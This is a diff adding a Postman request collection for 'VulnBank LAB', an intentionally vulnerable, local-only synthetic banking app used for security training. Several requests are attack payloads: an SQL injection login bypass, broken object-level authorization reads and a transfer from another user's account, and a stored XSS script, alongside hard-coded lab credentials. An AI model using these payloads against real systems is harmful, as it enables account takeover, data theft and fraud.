@@ -1,0 +1,144 @@
+{
+  "info": {
+    "name": "VulnBank LAB - Local only",
+    "description": "Intentionally vulnerable synthetic banking simulation. The demo HTTPS certificate is in server/certs/lab-cert.pem. Do not use outside the local lab.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://127.0.0.1:8080"
+    },
+    {
+      "key": "lab_api_key",
+      "value": "VULNBANK_LAB_KEY_123"
+    }
+  ],
+  "item": [
+    {
+      "name": "01 - Health",
+      "request": {
+        "method": "GET",
+        "url": "{{base_url}}/health"
+      }
+    },
+    {
+      "name": "02 - Normal login",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"username\":\"alice\",\"password\":\"password123\"}"
+        },
+        "url": "{{base_url}}/api/v1/auth/login"
+      }
+    },
+    {
+      "name": "03 - SQLi login (lab only)",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"username\":\"' OR 1=1 --\",\"password\":\"anything\"}"
+        },
+        "url": "{{base_url}}/api/v1/auth/login"
+      }
+    },
+    {
+      "name": "04 - Customers API key",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-API-Key",
+            "value": "{{lab_api_key}}"
+          }
+        ],
+        "url": "{{base_url}}/api/v1/customers"
+      }
+    },
+    {
+      "name": "05 - BOLA account 2",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-API-Key",
+            "value": "{{lab_api_key}}"
+          }
+        ],
+        "url": "{{base_url}}/api/v1/accounts/2"
+      }
+    },
+    {
+      "name": "06 - Transactions account 2",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-API-Key",
+            "value": "{{lab_api_key}}"
+          }
+        ],
+        "url": "{{base_url}}/api/v1/transactions?account_id=2"
+      }
+    },
+    {
+      "name": "07 - Submit Stored XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"userId\":1,\"subject\":\"Stored XSS\",\"message\":\"<script>alert(\\\"XSS\\\");</script>\"}"
+        },
+        "url": "{{base_url}}/api/v1/support"
+      }
+    },
+    {
+      "name": "08 - List tickets",
+      "request": {
+        "method": "GET",
+        "url": "{{base_url}}/api/v1/support"
+      }
+    },
+    {
+      "name": "09 - Transfer BOLA (synthetic funds ONLY)",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          },
+          {
+            "key": "X-API-Key",
+            "value": "{{lab_api_key}}"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"fromAccountId\": 2, \"toAccountId\": 1, \"amount\": 15.0, \"note\": \"BOLA lab\"}"
+        },
+        "url": "{{base_url}}/api/v1/transfers"
+      }
+    }
+  ]
+}
